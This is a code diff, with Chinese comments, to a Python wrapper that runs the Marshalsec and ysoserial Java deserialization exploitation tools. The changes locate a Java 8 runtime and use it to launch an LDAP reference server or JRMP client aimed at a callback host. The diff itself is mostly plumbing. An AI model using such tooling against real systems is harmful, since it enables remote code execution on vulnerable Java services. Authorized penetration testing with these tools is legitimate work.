@@ -13,6 +13,7 @@ class MarshalsecTool(CommandLineTool):
     Marshalsec 封装 - Java 反序列化漏洞利用工具
     支持 JNDI、RMI 等多种利用方式
 
+    注意: Marshalsec 需要 Java 8
     备选方案: 如果 marshalsec.jar 不可用，使用 ysoserial 作为替代
     """
 
@@ -24,7 +25,7 @@ class MarshalsecTool(CommandLineTool):
             "/app/thirdparty/Marshalsec.jar",
         ]
         # 使用 glob 查找编译后的 jar
-        compiled_jars = glob.glob("/app/thirdparty/marshalsec/target/marshalsec-*.jar")
+        compiled_jars = glob.glob("/app/thirdparty/marshalsec/target/marshalsec-*-all.jar")
         self.jar_paths.extend(compiled_jars)
 
         self.jar_path = None
@@ -40,7 +41,26 @@ class MarshalsecTool(CommandLineTool):
             self.use_ysoserial_fallback = True
             print("[Marshalsec] marshalsec.jar 不可用，使用 ysoserial 作为备选")
 
+        # 查找Java 8（marshalsec需要Java 8）
+        self.java_path = self._find_java8()
+
         self.timeout = 60
+
+    def _find_java8(self) -> str:
+        """查找Java 8路径（marshalsec需要Java 8）"""
+        # 优先检查Java 8路径
+        java8_paths = [
+            "/usr/lib/jvm/java-8-openjdk-amd64/bin/java",
+            "/usr/lib/jvm/java-8-openjdk/bin/java",
+            "/usr/lib/jvm/java-1.8.0-openjdk-amd64/bin/java",
+        ]
+        for path in java8_paths:
+            if os.path.exists(path):
+                return path
+        # 回退到系统java
+        import shutil
+        java = shutil.which("java")
+        return java or "java"
 
     def name(self) -> str:
         return "marshalsec"
@@ -91,7 +111,7 @@ class MarshalsecTool(CommandLineTool):
             # 使用 ysoserial 作为备选
             jar_path = self.ysoserial_path
             cmd = [
-                "java", "-jar", jar_path,
+                self.java_path, "-jar", jar_path,
                 "JRMPClient", callback_host
             ]
             tool_name = "ysoserial"
@@ -101,7 +121,7 @@ class MarshalsecTool(CommandLineTool):
                 return {"success": False, "error": "marshalsec.jar 和 ysoserial.jar 都不可用", "vulnerable": False}
 
             cmd = [
-                "java", "-cp", jar_path,
+                self.java_path, "-cp", jar_path,
                 "marshalsec.jndi.LDAPRefServer",
                 callback_host
             ]
